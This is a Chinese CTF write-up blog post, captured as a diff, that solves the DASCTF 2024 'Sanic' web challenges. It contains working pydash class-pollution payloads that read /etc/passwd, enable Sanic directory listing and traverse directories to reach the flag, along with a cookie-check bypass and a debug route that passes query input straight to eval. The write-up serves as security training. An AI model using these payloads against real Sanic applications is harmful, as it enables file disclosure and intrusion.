+<p>这里我卡住的第一个点就是对于adm;n的校验（国赛我就卡在了这里）因为这个是cookie，而我们又知道cookie的分隔符就是;，那么这里我们需要利用RFC2068 的编码规则，对;进行八进制转化，也就是转化为<code>adm\073n</code>就可以了<br>我们先尝试一下<br><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722192644.png"><br>我们发现可以成功绕过，于是继续往下走，去污染，发现源码在这里过滤了_.的组合</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> key <span class="hljs-keyword">and</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(key) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;_.&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key:<br></code></pre></td></tr></table></figure>
 <p>所以我们可以使用<code>_\\\\.</code>去绕过，所以我们可以使用这个payload进行任意文件读取</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&quot;key&quot;:&quot;.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;: &quot;/etc/passwd&quot;&#125;<br></code></pre></td></tr></table></figure>
-<p>之后发现可以任意文件读取，但是无法知道flag的位置和文件名，尝试读取&#x2F;flag未果后猜测需要列举目录<br>看了gxn师傅的博客发现是需要看app.static这个注册路由的功能，源码如下<br><img src="/images/Pasted%20image%2020240722194244.png" srcset="/img/loading.gif" lazyload><br>我们去看看下方的注释里怎么解释这几个参数的吧<br><img src="/images/Pasted%20image%2020240722194334.png" srcset="/img/loading.gif" lazyload><br>这里需要让directory_view为True才能开启目录列举，而directory_handler可以指定列举的目录，于是我们继续跟进这里的directory_view<br><img src="/images/Pasted%20image%2020240722194622.png" srcset="/img/loading.gif" lazyload><br>到了这里我们如何指定目录的方法也就明晰了，我们需要污染这里的directory和directory_view，前者为目录，后者为True，所以我们尝试看看怎么获取到static这个路由注册，这样我们就可以获取到我们想要的值<br>我们修改源码如下</p>
+<p>之后发现可以任意文件读取，但是无法知道flag的位置和文件名，尝试读取&#x2F;flag未果后猜测需要列举目录<br>看了gxn师傅的博客发现是需要看app.static这个注册路由的功能，源码如下<br><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722194244.png"><br>我们去看看下方的注释里怎么解释这几个参数的吧<br><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722194334.png"><br>这里需要让directory_view为True才能开启目录列举，而directory_handler可以指定列举的目录，于是我们继续跟进这里的directory_view<br><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722194622.png"><br>到了这里我们如何指定目录的方法也就明晰了，我们需要污染这里的directory和directory_view，前者为目录，后者为True，所以我们尝试看看怎么获取到static这个路由注册，这样我们就可以获取到我们想要的值<br>我们修改源码如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sanic <span class="hljs-keyword">import</span> Sanic<br><span class="hljs-keyword">from</span> sanic.response <span class="hljs-keyword">import</span> text, html<br><span class="hljs-keyword">from</span> sanic_session <span class="hljs-keyword">import</span> Session<br><span class="hljs-keyword">import</span> pydash<br><span class="hljs-comment"># pydash==5.1.2</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pollute</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><br>app = Sanic(__name__)<br>app.static(<span class="hljs-string">&quot;/static/&quot;</span>, <span class="hljs-string">&quot;./static/&quot;</span>)<br><span class="hljs-comment"># Session(app)</span><br><br><br><span class="hljs-comment"># @app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="hljs-comment"># async def index(request):</span><br><span class="hljs-comment">#     return html(open(&#x27;static/index.html&#x27;).read())</span><br><br><br><span class="hljs-comment"># @app.route(&quot;/login&quot;)</span><br><span class="hljs-comment"># async def login(request):</span><br><span class="hljs-comment">#     user = request.cookies.get(&quot;user&quot;)</span><br><span class="hljs-comment">#     if user.lower() == &#x27;adm;n&#x27;:</span><br><span class="hljs-comment">#         request.ctx.session[&#x27;admin&#x27;] = True</span><br><span class="hljs-comment">#         return text(&quot;login success&quot;)</span><br><br><span class="hljs-comment">#     return text(&quot;login fail&quot;)</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/src&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-comment"># return text(open(__file__).read())</span><br>    <span class="hljs-built_in">eval</span>(request.args.get(<span class="hljs-string">&quot;fault&quot;</span>))<br>    <span class="hljs-keyword">return</span> text(<span class="hljs-built_in">open</span>(__file__).read())<br><br><br><span class="hljs-comment"># @app.route(&quot;/admin&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="hljs-comment"># async def admin(request):</span><br><span class="hljs-comment">#     if request.ctx.session.get(&#x27;admin&#x27;) == True:</span><br><span class="hljs-comment">#         key = request.json[&#x27;key&#x27;]</span><br><span class="hljs-comment">#         value = request.json[&#x27;value&#x27;]</span><br><span class="hljs-comment">#         if key and value and type(key) is str and &#x27;_.&#x27; not in key:</span><br><span class="hljs-comment">#             pollute = Pollute()</span><br><span class="hljs-comment">#             pydash.set_(pollute, key, value)</span><br><span class="hljs-comment">#             return text(&quot;success&quot;)</span><br><span class="hljs-comment">#         else:</span><br><span class="hljs-comment">#             return text(&quot;forbidden&quot;)</span><br><br><span class="hljs-comment">#     return text(&quot;forbidden&quot;)</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br><br></code></pre></td></tr></table></figure>
 <p>然后使用</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8000</span>/src?fault=<span class="hljs-built_in">print</span>(app.router.name_index)<br></code></pre></td></tr></table></figure>
-<p>来列举注册过的路由，控制台回显如下<br><img src="/images/Pasted%20image%2020240722200202.png" srcset="/img/loading.gif" lazyload><br>所以我们的名字就是</p>
+<p>来列举注册过的路由，控制台回显如下<br><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722200202.png"><br>所以我们的名字就是</p>
 <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">__mp_main__.<span class="hljs-type">static</span><br></code></pre></td></tr></table></figure>
 <p>然后我们通过索引去访问键值</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1:8000/src?fault=print(app.router.name_index[%27__mp_main__.static%27])<br></code></pre></td></tr></table></figure>
-<p><img src="/images/Pasted%20image%2020240722200334.png" srcset="/img/loading.gif" lazyload><br>但是我们的目的是要修改directory和directory_view，那么我们怎么获取到他们呢<br>这里就用到了name_index，在这里打断点看看(这里强烈建议使用pycharm)<br><img src="/images/Pasted%20image%2020240722203749.png" srcset="/img/loading.gif" lazyload><br>这里我们找到了self.name_index[name]&#x3D;route于是我们在这里下断点看看<br><img src="/images/Pasted%20image%2020240722203956.png" srcset="/img/loading.gif" lazyload><br><img src="/images/Pasted%20image%2020240722204924.png" srcset="/img/loading.gif" lazyload><br>我们发现handler可以获取到路由的状态，于是我们可以通过污染这个属性中的变量来达到我们方才分析的目的<br>于是我们接着尝试</p>
+<p><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722200334.png"><br>但是我们的目的是要修改directory和directory_view，那么我们怎么获取到他们呢<br>这里就用到了name_index，在这里打断点看看(这里强烈建议使用pycharm)<br><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722203749.png"><br>这里我们找到了self.name_index[name]&#x3D;route于是我们在这里下断点看看<br><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722203956.png"><br><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722204924.png"><br>我们发现handler可以获取到路由的状态，于是我们可以通过污染这个属性中的变量来达到我们方才分析的目的<br>于是我们接着尝试</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1:8000/src?fault=print(app.router.name_index[&quot;__mp_main__.static&quot;].handler.keywords[&quot;directory_handler&quot;])<br></code></pre></td></tr></table></figure>
-<p><img src="/images/Pasted%20image%2020240722205432.png" srcset="/img/loading.gif" lazyload><br>我们发现可以成功的调到这里，那么我们就可以通过污染它的值来进行利用<br>污染的payload如下</p>
+<p><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722205432.png"><br>我们发现可以成功的调到这里，那么我们就可以通过污染它的值来进行利用<br>污染的payload如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;: true&#125;<br><br></code></pre></td></tr></table></figure>
-<p>（这里使用bp发包，也不知道我的hackbar有什么毛病）<br>发现回显为success，也就证明我们开启了目录列举功能<br>那么我们下一步的目标也很明确，就是污染到directory<br><img src="/images/Pasted%20image%2020240722211223.png" srcset="/img/loading.gif" lazyload><br>我们尝试和刚才一样，直接污染directory，我们会发现方才的directory_view只是一个值，但是directory却是一个turple，所以我们没有办法直接去污染，我们找找看这个turple是在哪里被赋值的<br><img src="/images/Pasted%20image%2020240722212224.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/images/Pasted%20image%2020240722212210.png" srcset="/img/loading.gif" lazyload><br>我们可以看到，这个parts的值其实最后是给了_parts<br>于是我们访问这个值看看</p>
+<p>（这里使用bp发包，也不知道我的hackbar有什么毛病）<br>发现回显为success，也就证明我们开启了目录列举功能<br>那么我们下一步的目标也很明确，就是污染到directory<br><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722211223.png"><br>我们尝试和刚才一样，直接污染directory，我们会发现方才的directory_view只是一个值，但是directory却是一个turple，所以我们没有办法直接去污染，我们找找看这个turple是在哪里被赋值的<br><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722212224.png"></p>
+<p><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722212210.png"><br>我们可以看到，这个parts的值其实最后是给了_parts<br>于是我们访问这个值看看</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">print(app.router.name_index[&quot;__mp_main__.static&quot;].handler.keywords[&quot;directory_handler&quot;].directory._parts)<br></code></pre></td></tr></table></figure>
-<p><img src="/images/Pasted%20image%2020240722212909.png" srcset="/img/loading.gif" lazyload><br>这里可能会有疑问，就是为什么非要去找这个_parts不可，而不是直接去污染这个parts，那么我们就要提到python中最基础的问题，turple和list的区别，如果我们去访问parts这个值，我们会发现返回值如下<br><img src="/images/Pasted%20image%2020240722215443.png" srcset="/img/loading.gif" lazyload><br>所以这也就是为什么我们需要找到_parts这个值不可了，一切的问题解决，我们的payload也呼之欲出</p>
+<p><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722212909.png"><br>这里可能会有疑问，就是为什么非要去找这个_parts不可，而不是直接去污染这个parts，那么我们就要提到python中最基础的问题，turple和list的区别，如果我们去访问parts这个值，我们会发现返回值如下<br><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722215443.png"><br>所以这也就是为什么我们需要找到_parts这个值不可了，一切的问题解决，我们的payload也呼之欲出</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"><br>&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;: true&#125;<br><br><br>&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;: [&quot;/&quot;]&#125;<br></code></pre></td></tr></table></figure>
-<p><img src="/images/Pasted%20image%2020240722220557.png" srcset="/img/loading.gif" lazyload><br>如果我们要得到flag文件，还需要进行一次污染</p>
+<p><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722220557.png"><br>如果我们要得到flag文件，还需要进行一次污染</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"><br>&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;: &quot;/24bcbd0192e591d6ded1_flag&quot;&#125;<br></code></pre></td></tr></table></figure>
 <p>这样我们就可以在&#x2F;src路由中得到flag了</p>
 <h2 id="DASCTF-2024-七月赛-web-Sanic’s-revenge"><a href="#DASCTF-2024-七月赛-web-Sanic’s-revenge" class="headerlink" title="DASCTF 2024 七月赛 web Sanic’s revenge"></a>DASCTF 2024 七月赛 web Sanic’s revenge</h2><p>这个题目是gxn师傅基于自己的另一个探索，也就是这道题的考点了<br>我们先看题目中可以直接获得的源码</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sanic <span class="hljs-keyword">import</span> Sanic<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> sanic.response <span class="hljs-keyword">import</span> text, html<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> pydash<br><span class="hljs-comment"># pydash==5.1.2</span><br><br><span class="hljs-comment"># 这里的源码好像被admin删掉了一些，听他说里面藏有大秘密</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pollute</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br>app = Sanic(__name__)<br>app.static(<span class="hljs-string">&quot;/static/&quot;</span>, <span class="hljs-string">&quot;./static/&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/*****secret********&quot;</span></span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">secret</span>(<span class="hljs-params">request</span>):<br>    secret=<span class="hljs-string">&#x27;**************************&#x27;</span><br>    <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;can you find my route name ???&quot;</span>+secret)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">return</span> html(<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;static/index.html&#x27;</span>).read())<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/pollute&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">POLLUTE</span>(<span class="hljs-params">request</span>):<br>    key = request.json[<span class="hljs-string">&#x27;key&#x27;</span>]<br>    value = request.json[<span class="hljs-string">&#x27;value&#x27;</span>]<br>    <span class="hljs-keyword">if</span> key <span class="hljs-keyword">and</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(key) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;parts&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> key <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;proc&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(value) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(value) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">list</span>:<br>        pollute = Pollute()<br>        pydash.set_(pollute, key, value)<br>        <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;success&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        log_dir = create_log_dir(<span class="hljs-number">6</span>)<br>        log_dir_bak = log_dir + <span class="hljs-string">&quot;..&quot;</span><br>        log_file = <span class="hljs-string">&quot;/tmp/&quot;</span> + log_dir + <span class="hljs-string">&quot;/access.log&quot;</span><br>        log_file_bak = <span class="hljs-string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="hljs-string">&quot;/access.log.bak&quot;</span><br>        log = <span class="hljs-string">&#x27;key: &#x27;</span> + <span class="hljs-built_in">str</span>(key) + <span class="hljs-string">&#x27;|&#x27;</span> + <span class="hljs-string">&#x27;value: &#x27;</span> + <span class="hljs-built_in">str</span>(value);<br>        <span class="hljs-comment"># 生成日志文件</span><br>        os.system(<span class="hljs-string">&quot;mkdir /tmp/&quot;</span> + log_dir)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(log_file, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(log)<br>        <span class="hljs-comment"># 备份日志文件</span><br>        os.system(<span class="hljs-string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(log_file_bak, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(log)<br>        <span class="hljs-keyword">return</span> text(<span class="hljs-string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br></code></pre></td></tr></table></figure>
 <p>这段源码不难审计，但是最重要的点就是我们需要对这个file_or_directory的源码的审计<br>我们继续去审计原来的代码</p>
 <blockquote>
-<p>疑问解答（感谢万能的晨曦✌）<br>Q:这个handle在哪儿调用了呀就要看这里<br>A:我们发现当用户请求一个目录，sanic路由系统匹配到静态文件服务路由，就会调用 <code>_static_request_handler</code>方法，这个方法中会调用handle方法，而执行这里<img src="/images/Pasted%20image%2020240722232106.png" srcset="/img/loading.gif" lazyload><br>代码的要求是directory_view为true</p>
+<p>疑问解答（感谢万能的晨曦✌）<br>Q:这个handle在哪儿调用了呀就要看这里<br>A:我们发现当用户请求一个目录，sanic路由系统匹配到静态文件服务路由，就会调用 <code>_static_request_handler</code>方法，这个方法中会调用handle方法，而执行这里<img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722232106.png"><br>代码的要求是directory_view为true</p>
 </blockquote>
-<p>解决了这个问题，我们接下来看一些代码里的问题<br><img src="/images/Pasted%20image%2020240722234752.png" srcset="/img/loading.gif" lazyload><br>如果directory_view是true，就会进入_index，我们去看看_index<br><img src="/images/Pasted%20image%2020240723000019.png" srcset="/img/loading.gif" lazyload><br>前面的路径就是由directory+current拼接起来的<br>所以我们如果可以控制current的值，也就可以实现目录穿越了<br>那么我们来看看current的处理逻辑<br><img src="/images/Pasted%20image%2020240723000458.png" srcset="/img/loading.gif" lazyload><br>它其实是依赖于base和path的，那么如果我们可以控制这俩，我们就可以控制current</p>
+<p>解决了这个问题，我们接下来看一些代码里的问题<br><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240722234752.png"><br>如果directory_view是true，就会进入_index，我们去看看_index<br><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240723000019.png"><br>前面的路径就是由directory+current拼接起来的<br>所以我们如果可以控制current的值，也就可以实现目录穿越了<br>那么我们来看看current的处理逻辑<br><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240723000458.png"><br>它其实是依赖于base和path的，那么如果我们可以控制这俩，我们就可以控制current</p>
 <h3 id="path"><a href="#path" class="headerlink" title="path"></a>path</h3><p>path来说，它就是我们网页访问的路径，是可控的</p>
 <h3 id="base"><a href="#base" class="headerlink" title="base"></a>base</h3><p>base是属性，可以被污染，所以也是可控的<br>那么我们就可以做到控制current了</p>
 <blockquote>
@@ -367,366 +174,57 @@
 <p>这个hint也就提示我们列举目录<br>列举目录的方式也就是我们方才思路里说的<br>&#x3D;&#x3D;所以结合题目情况的总的思路就是，先开启目录列举，再构造或者找出一个带..的path，然后污染base使得current为..，这样就可以穿越到上层目录中实现列目录了&#x3D;&#x3D;<br>结合这两个难点被解决，以及如何列目录的方式被我们找到，那么一切都呼之欲出<br>payload如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler._parts&quot;,&quot;value&quot;: &quot;/&quot;&#125; #非法操作触发记录<br><br>&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;: true&#125; #开启目录列举<br><br>&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;,&quot;value&quot;: &quot;/tmp&quot;&#125; #切换目录到/tmp下<br><br>&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&quot;,&quot;value&quot;: &quot;static/4FokJS&quot;&#125; #污染base<br><br><br></code></pre></td></tr></table></figure>
 
-<p>这样我们就可以在&#x2F;static&#x2F;4FokJS..&#x2F;下看到flag的名字了<br>但是这还不够，如果我们这个时候直接访问&#x2F;static&#x2F;app&#x2F;flag的话会出现如下情况<br><img src="/images/Pasted%20image%2020240723004441.png" srcset="/img/loading.gif" lazyload><br>这是因为我们的file_or_directory还在&#x2F;tmp目录，我们需要切换到根目录，才能读到flag<br>那么有人说我既然都能看到flag了，为什么不能在&#x2F;static&#x2F;4FokJS..&#x2F;目录下直接读<br>就像这样</p>
+<p>这样我们就可以在&#x2F;static&#x2F;4FokJS..&#x2F;下看到flag的名字了<br>但是这还不够，如果我们这个时候直接访问&#x2F;static&#x2F;app&#x2F;flag的话会出现如下情况<br><img src= "/img/loading.avif" data-lazy-src="/images/Pasted%20image%2020240723004441.png"><br>这是因为我们的file_or_directory还在&#x2F;tmp目录，我们需要切换到根目录，才能读到flag<br>那么有人说我既然都能看到flag了，为什么不能在&#x2F;static&#x2F;4FokJS..&#x2F;目录下直接读<br>就像这样</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://c4a6e774-5e02-4d07-b787-a7221e2bc985.node5.buuoj.cn:81/static/4FokJS../45W698WqtsgQT1_flag<br></code></pre></td></tr></table></figure>
 <p>那么就要思考一个问题了，我们使用&#x2F;static&#x2F;4FokJS..&#x2F;的目的是什么，是为了构造出current为..来读取上层目录，如果直接这样读取，我们的current显然不再是..，那么&#x2F;static&#x2F;4FokJS..&#x2F;也就不再是上层目录了，所以这样才会找不到flag<br>所以我们还需要加一个payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;,&quot;value&quot;: &quot;/&quot;&#125; #切换回根目录<br></code></pre></td></tr></table></figure>
 <p>我们继续污染file_or_directory到根目录，这样我们就可以通过&#x2F;app&#x2F;45W698WqtsgQT1_flag得到flag了</p>
+</article><div class="post-copyright"><div class="post-copyright__author_group"><a class="post-copyright__author_img" href="/about/"><img class="post-copyright__author_img_front" src= "/img/loading.avif" data-lazy-src="/img/bitbug_favicon.ico"></a><div class="post-copyright__author_name">fault`s blog</div><div class="post-copyright__author_desc"></div></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div id="quit-box" onclick="RemoveRewardMask()"></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本文是原创文章，采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>协议，完整转载请注明来自<a href="/">fault`s blog</a></span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/"><span class="tags-punctuation"><i class="solitude fa-solid fa-hashtag"></i>Web<span class="tagsPageCount">1</span></span></a><a class="post-meta__tags" href="/tags/%E6%AF%94%E8%B5%9Bwp/"><span class="tags-punctuation"><i class="solitude fa-solid fa-hashtag"></i>比赛wp<span class="tagsPageCount">1</span></span></a></div></div></div><nav class="needEndHide pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/26/%E5%B7%A5%E5%9D%8Awp-RSA1/"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">nss-工坊wp</div></div></a></div><div class="next-post pull-right"><a href="/2024/03/21/NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">NTLM认证学习</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><div class="author-info__top-group"><div class="author-info__sayhi" id="author-info__sayhi" onclick="sco.changeSayHelloText()">sayhello.morning</div></div></div><div class="avatar-img-group"><img class="avatar-img" alt="头像" src= "/img/loading.avif" data-lazy-src="/img/douni.jpg"><div class="avatar-sticker"><img class="avatar-sticker-img" src= "/img/loading.avif" data-lazy-src="/img/douni.jpg" alt="心情贴纸"></div></div><div class="author-info__description_group"><div 